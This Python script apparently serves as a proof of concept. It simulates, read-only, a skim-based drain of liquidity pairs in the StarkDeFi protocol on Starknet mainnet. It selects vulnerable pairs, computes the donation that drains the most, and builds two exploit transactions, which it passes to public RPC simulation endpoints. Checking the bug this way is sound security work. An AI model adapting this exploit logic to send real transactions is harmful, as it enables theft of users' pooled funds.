#!/usr/bin/env python3
"""End-to-end read-only simulation of the StarkDeFi pre-fix skim drain.

Sender: the protocol's own fee_handler account (ArgentX/OZ account, holds 58.2 STRK)
  - no signature needed: simulation_flags = SKIP_VALIDATE + SKIP_FEE_CHARGE
  - state is discarded (simulation only; nothing is signed or sent)
Tx1: skim() on a pair where b0 > r1  -> free steal (no donation)
Tx2: STRK.transfer(pair, d) + pair.skim(sender) on a JEDI-P pair -> full token1 drain
"""
import json, urllib.request, subprocess, os, time

ENDPOINTS=["https://starknet-rpc.publicnode.com","https://api.cartridge.gg/x/starknet/mainnet","https://starknet.api.onfinality.io/public"]
HERE=os.path.dirname(os.path.abspath(__file__)); OUT=os.path.join(HERE,"..","analysis")

def rpc(url, method, params, timeout=90):
    req=urllib.request.Request(url,data=json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode(),headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
    with urllib.request.urlopen(req,timeout=timeout) as r: return json.loads(r.read().decode())

def sel(f):
    h=subprocess.run(["cast","keccak",f],capture_output=True,text=True).stdout.strip()
    return hex(int(h,16)&((1<<250)-1))

SENDER="0x283b6df5330e5ba0c9ffc4a5c80de4227bdab78b6a155654ae78f220d6bdf53"
STRK="0x04718f5a0fc34cc1af16a1cdee98ffb20c31ee..."  # fixed below

def main():
    pairs={json.loads(l)["pair"]:json.loads(l) for l in open(os.path.join(OUT,"pairs_raw.jsonl"))}
    bals={json.loads(l)["pair"]:json.loads(l) for l in open(os.path.join(OUT,"pair_balances.jsonl"))}
    # Tx1 pair: free steal (b0 > r1) -- pick from the BUGGY class only
    meta=json.load(open(os.path.join(OUT,"factory_state.json")))
    chs=meta["pair_class_hashes"]
    BUG="0xaef408ec73c83edbc42d00af164ae8073404aa665b9895041c705c871809f9"
    tx1_pairs=[p for p in pairs if chs.get(p)==BUG and bals[p]["b0"]>bals[p]["r1"] and bals[p]["b0"]-bals[p]["r1"]<=bals[p]["b1"] and (bals[p]["b0"]-bals[p]["r1"])>0]
    tx1_pairs.sort(key=lambda p: bals[p]["b0"]-bals[p]["r1"], reverse=True)
    P1=tx1_pairs[0]
    # Tx2 pair: JEDI-P full drain candidate 0x46632b...
    P2=[p for p in pairs if p.startswith("0x46632b5586cf")][0]
    s1=pairs[P1]; b1=bals[P1]
    s2=pairs[P2]; b2=bals[P2]
    d = b2["r1"] + b2["b1"] - b2["b0"]
    print("Tx1 pair",P1,"token0",s1["token0"][:14],"steal",b1["b0"]-b1["r1"])
    print("Tx2 pair",P2,"token0",s2["token0"][:14],"token1",s2["token1"][:14],"donation d",d)
    assert d>0
    STRK_ADDR=s2["token0"]
    SEL_EXEC=sel("__execute__")
    def call_arr(calls):
        cd=[hex(len(calls))]
        for to,s,args in calls:
            cd.append(to); cd.append(s); cd.append(hex(len(args))); cd.extend(args)
        return cd
    calls1=[(P1, sel("skim"), [SENDER])]
    calls2=[(STRK_ADDR, sel("transfer"), [P2, hex(d), "0x0"]),
            (P2, sel("skim"), [SENDER])]
    tx1={"type":"INVOKE","version":"0x3","sender_address":SENDER,"calldata":call_arr(calls1),
         "signature":[],"nonce":"0x123",
         "resource_bounds":{"l1_gas":{"max_amount":"0x2000000","max_price_per_unit":"0x40000000000"},
                            "l1_data_gas":{"max_amount":"0x2000000","max_price_per_unit":"0x40000000000"},
                            "l2_gas":{"max_amount":"0x200000000","max_price_per_unit":"0x40000000000"}},
         "tip":"0x0","paymaster_data":[],"account_deployment_data":[],
         "nonce_data_availability_mode":"L1","fee_data_availability_mode":"L1"}
    tx2=dict(tx1); tx2["calldata"]=call_arr(calls2); tx2["nonce"]="0x124"
    for url in ENDPOINTS:
        try:
            out=rpc(url,"starknet_simulateTransactions",["latest",[tx1,tx2],["SKIP_VALIDATE","SKIP_FEE_CHARGE"]])
            if "result" in out:
                with open(os.path.join(OUT,"simulate_drain_result.json"),"w") as fh:
                    json.dump(out,fh,indent=1)
                print("simulation OK on",url)
                for i,res in enumerate(out["result"]):
                    tr=res.get("transaction_trace",{})
                    def walk(c,depth=0):
                        to=c.get("contract_address"); cd=c.get("calldata") or []
                        entry=c.get("entry_point_selector") or c.get("entry_point")
                        if depth<6:
                            print("  "*depth, "→", str(to)[:18], str(entry)[:20], str(cd)[:120])
                        for sub in c.get("calls",[]) or []:
                            walk(sub,depth+1)
                    print("== tx",i+1)
                    walk(tr.get("execute_invocation",{}))
                return
            else:
                print(url,"->",json.dumps(out)[:200])
        except Exception as e:
            print(url,"ERR",repr(e)[:160])

if __name__=="__main__":
    main()
